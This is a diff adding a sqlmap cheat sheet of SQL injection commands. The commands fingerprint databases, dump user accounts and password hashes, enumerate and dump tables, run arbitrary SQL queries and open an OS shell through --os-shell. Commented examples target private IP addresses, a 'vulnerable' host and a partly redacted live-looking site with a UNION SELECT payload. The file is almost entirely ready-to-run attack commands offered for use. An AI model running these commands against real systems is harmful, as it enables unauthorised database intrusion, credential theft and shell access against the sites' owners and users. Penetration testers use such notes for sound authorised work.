@@ -1,0 +1,72 @@
+# andrew <andrewjkerr>
+# Test URL and POST data and return database banner (if possible)
+
+./sqlmap.py --url="<url>" --data="<post-data>" --banner
+
+# Parse request data and test | request data can be obtained with burp
+./sqlmap.py -r <request-file> <options>
+
+# Fingerprint | much more information than banner
+./sqlmap.py -r <request-file> --fingerprint
+
+# Get database username, name, and hostname
+./sqlmap.py -r <request-file> --current-user --current-db --hostname
+
+# Check if user is a database admin
+./sqlmap.py -r <request-file> --is-dba
+
+# Get database users and password hashes
+./sqlmap.py -r <request-file> --users --passwords
+
+# Enumerate databases
+./sqlmap.py -r <request-file> --dbs
+
+# List tables for one database
+./sqlmap.py -r <request-file> -D <db-name> --tables
+
+# Other database commands
+./sqlmap.py -r <request-file> -D <db-name> --columns
+					   --schema
+					   --count
+# Enumeration flags
+./sqlmap.py -r <request-file> -D <db-name>
+			      -T <tbl-name>
+			      -C <col-name>
+			      -U <user-name>
+
+# Extract data
+./sqlmap.py -r <request-file> -D <db-name> -T <tbl-name> -C <col-name> --dump
+
+# Execute SQL Query
+./sqlmap.py -r <request-file> --sql-query="<sql-query>"
+
+# Append/Prepend SQL Queries
+./sqlmap.py -r <request-file> --prefix="<sql-query>" --suffix="<sql-query>"
+
+# Get backdoor access to sql server | can give shell access
+./sqlmap.py -r <request-file> --os-shell
+
+# Cookies
+# sqlmap.py -u "http://192.168.1.136/newsletter&id=1" --cookie="PHPSESSID=ilu6l7aemran0kdcgerhfd1jv7" --dbms="MySQL" -v 1 --dbs
+
+# sqlmap -v 2 -u "http://10.0.0.1/products.php?id=1" --current-user
+# sqlmap -v 2 -u "http://10.0.0.1/products.php?id=1" --is-dba
+# sqlmap -v 2 -u "http://10.0.0.1/products.php?id=1" --users
+# sqlmap.py -u <URL> --dbs | dbms
+# sqlmap.py -u <URL> -D <BASE_DATOS> --tables
+# sqlmap.py -u <URL> -T users --columns
+# sqlmap.py -u <URL> -T users -c name -U test
+# sqlmap.py -u <URL> -T users -c password -U test --dump
+# sqlmap.py -u <URL> -T users -U test --dump
+# sqlmap.py -u "http://vulnerable/" --headers="X-Forwarded-For: *" --banner
+# sqlmap.py -u "http://vulnerable/" --headers="X-Forwarded-For: *" --dbs
+# sqlmap.py -u "http://vulnerable/" --headers="X-Forwarded-For: *" -D photoblog --tables
+# sqlmap.py -u "http://vulnerable/" --headers="X-Forwarded-For: *" -D photoblog -T users --column
+# sqlmap.py -u "http://vulnerable/" --headers="X-Forwarded-For: *" -D photoblog -T users --dump --batch
+# sqlmap.py -u http://10.0.0.12/cat.php?id=3
+# sqlmap.py -u http://10.0.0.12/cat.php?id=3 --dbms="MYSQL"
+# sqlmap.py -u http://10.0.0.12/cat.php?id=3 --dbms="MYSQL" -v 1 --dbs
+# sqlmap.py -u http://10.0.0.12/cat.php?id=3 --dbms="MYSQL" -v 1 --dump
+
+
+# sqlmap.py -u 'https://www.[URL]/products.php?cid=75,82&pid=999999.9 union all select 1,2,3,4,5,6,7,8,9,[t],11,12,13,14,15,16,17,18,19,20,21,22,23--' --dbs --no-cast --random-agent 
